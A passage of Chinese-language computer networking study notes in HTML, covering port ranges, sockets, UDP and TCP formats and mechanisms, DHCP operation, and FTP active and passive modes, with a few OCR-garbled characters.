title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="./网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="./网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="./网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="./网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src="./网际协议IP/TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src="./网际协议IP/TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src="./网际协议IP/TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li> 与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li> 目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li> MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li> 连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src="./网际协议IP/TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src="./网际协议IP/第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src="./网际协议IP/第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src="./网际协议IP/第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src="./网际协议IP/半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src="./网际协议IP/滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src="./网际协议IP/拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src="./网际协议IP/慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src="./网际协议IP/快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src="./网际协议IP/快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul><h2 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="./网际协议IP/DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="./网际协议IP/DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="./网际协议IP/DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="./网际协议IP/DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="./网际协议IP/DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="./网际协议IP/DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="./网际协议IP/DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul><h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="./网际协议IP/创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="./网际协议IP/FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="./网际协议IP/FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT 